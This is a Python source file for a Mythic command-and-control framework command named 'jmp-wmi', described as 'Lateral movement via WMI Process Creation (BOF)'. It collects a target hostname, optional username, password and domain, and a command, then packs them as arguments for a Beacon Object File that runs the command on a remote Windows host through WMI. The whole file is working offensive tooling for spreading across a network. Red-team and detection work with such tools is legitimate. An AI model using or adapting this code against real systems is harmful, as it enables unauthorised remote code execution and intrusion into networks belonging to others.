from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging

from .Utils.u import *

class PsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="hostname",
                cli_name="hostname",
                display_name="Target Host",
                type=ParameterType.String,
                description="Target hostname or IP address",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                display_name="Username",
                type=ParameterType.String,
                description="Username for authentication",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="Password for authentication",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain for authentication",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="command",
                cli_name="command",
                display_name="Command",
                type=ParameterType.String,
                description="Command to execute",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="parameters",
                cli_name="parameters",
                display_name="Parameters",
                type=ParameterType.String,
                description="Command parameters",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                if len(args) >= 1:
                    self.add_arg("hostname", args[0])
                if len(args) >= 2:
                    self.add_arg("username", args[1])
                if len(args) >= 3:
                    self.add_arg("password", args[2])
                if len(args) >= 4:
                    self.add_arg("domain", args[3])
                if len(args) >= 5:
                    self.add_arg("command", args[4])
                if len(args) >= 6:
                    self.add_arg("parameters", args[5])

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class PsexecCommand(CommandBase):
    cmd = "jmp-wmi"
    needs_admin = False
    help_cmd = "jmp-wmi"
    description = "Lateral movement via WMI Process Creation (BOF)"
    version = 1
    author = "@Oblivion"
    argument_class = PsexecArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content: bytes = await get_content_by_name("kh_jmp-wmi.x64.o", task.Task.ID)

        hostname = task.args.get_arg("hostname")
        username = task.args.get_arg("username") or ""
        password = task.args.get_arg("password") or ""
        domain = task.args.get_arg("domain") or ""
        command = task.args.get_arg("command")
        parameters = task.args.get_arg("parameters") or ""

        # Determine if using current user context
        is_current = 0 if username else 1

        # Format target string like the Beacon Script example
        target = f"\\\\{hostname}\\ROOT\\CIMV2"
        commandline = f"{command} {parameters}"

        display_params = f" -hostname {hostname}"
        if username:
            display_params += f" -username {username}"
        if domain:
            display_params += f" -domain {domain}"
        display_params += f" -command {commandline}"

        # Pack arguments similar to the Beacon Script's bof_pack
        bof_args = [
            {"type": "wchar", "value": target},
            {"type": "wchar", "value": domain},
            {"type": "wchar", "value": username},
            {"type": "wchar", "value": password},
            {"type": "wchar", "value": commandline},
            {"type": "int32", "value": is_current}
        ]

        # Clean up args that will be passed via BOF
        task.args.remove_arg("hostname")
        task.args.remove_arg("username")
        task.args.remove_arg("password")
        task.args.remove_arg("domain")
        task.args.remove_arg("command")
        task.args.remove_arg("parameters")

        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_id", 0, ParameterType.Number)
        task.args.add_arg("bof_args", json.dumps(bof_args))

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="exec-bof",
            TokenID=task.Task.TokenID,
            DisplayParams=display_params
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp